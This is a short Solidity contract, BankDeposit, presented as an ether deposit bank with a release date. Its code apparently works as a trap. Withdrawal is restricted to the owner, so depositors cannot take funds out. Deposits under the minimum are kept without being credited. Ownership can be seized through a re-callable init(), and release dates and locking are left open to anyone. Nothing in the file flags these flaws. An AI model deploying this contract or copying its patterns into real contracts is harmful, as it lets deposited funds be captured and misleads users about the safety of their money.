1 pragma solidity ^0.4.13;
2 
3 contract BankDeposit {
4     
5     event Deposit(address indexed depositor, uint amount);
6     event Withdrawal(address indexed to, uint amount);
7 
8     address Owner;
9     function transferOwnership(address to) public onlyOwner {
10         Owner = to;
11     }
12     modifier onlyOwner { if (msg.sender == Owner) _; }
13     
14     mapping (address => uint) public Deposits;
15     uint minDeposit;
16     bool Locked;
17     uint Date;
18 
19     function init() payable open {
20         Owner = msg.sender;
21         minDeposit = 0.25 ether;
22         Locked = false;
23         deposit();
24     }
25     
26     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
27 
28     function setRelease(uint newDate) public {
29         Date = newDate;
30     }
31     function ReleaseDate() public constant returns (uint) { return Date; }
32     function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
33 
34     function() public payable { deposit(); }
35 
36     function deposit() public payable {
37         if (msg.value > 0) {
38             if (msg.value >= MinimumDeposit())
39                 Deposits[msg.sender] += msg.value;
40             Deposit(msg.sender, msg.value);
41         }
42     }
43 
44     function withdraw(uint amount) public { return withdrawTo(msg.sender, amount); }
45     
46     function withdrawTo(address to, uint amount) public onlyOwner {
47         if (WithdrawEnabled()) {
48             uint max = Deposits[msg.sender];
49             if (max > 0 && amount <= max) {
50                 to.transfer(amount);
51                 Withdrawal(to, amount);
52             }
53         }
54     }
55 
56     function lock() public { Locked = true; }
57     modifier open { if (!Locked) _; }
58     function kill() { require(this.balance == 0); selfdestruct(Owner); }
59 }